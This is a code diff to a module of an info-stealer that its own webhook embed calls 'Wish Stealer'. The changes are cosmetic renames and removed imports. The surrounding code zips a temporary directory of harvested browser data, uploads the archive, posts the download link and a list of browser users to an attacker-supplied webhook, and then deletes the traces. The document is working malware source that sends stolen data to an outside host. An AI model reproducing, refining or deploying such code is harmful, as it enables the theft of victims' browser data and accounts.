@@ -1,4 +1,3 @@
-const fs = require('fs');
 const path = require('path');
 const os = require('os');
 
@@ -6,7 +5,6 @@ const structures = require('../browsers/structures.js');
 
 const requests = require('./../../utils/requests/requests.js');
 const fileutil = require('./../../utils/fileutil/fileutil.js');
-const hardware = require('./../../utils/hardware/hardware.js');
 
 const BrowserStats = structures.BrowserStatistics;
 
@@ -15,14 +13,14 @@ module.exports = async (webhookUrl) => {
     const wishTempZip = path.join(os.tmpdir(), 'wish.zip');
 
     try {
-        await fileutil.zipDirectory({
+        await fileutil.ZipDirectory({
             inputDir: wishTempDir,
             outputZip: wishTempZip
-        });
+        })
 
-        const link = await requests.upload(wishTempZip)
+        const link = await requests.Upload(wishTempZip);
 
-        await requests.webhook(webhookUrl, {
+        await requests.Webhook(webhookUrl, {
             embeds: [{
                 title: 'Wish Stealer',
                 description: '```' + BrowserStats.users.join(',\n') + '```',
@@ -72,7 +70,7 @@ module.exports = async (webhookUrl) => {
         });
 
         [wishTempDir, wishTempZip].forEach(async dir => {
-            await fileutil.removeDir(dir);
+            await fileutil.RemoveDir(dir);
         });
     } catch (error) {
         console.error(error);
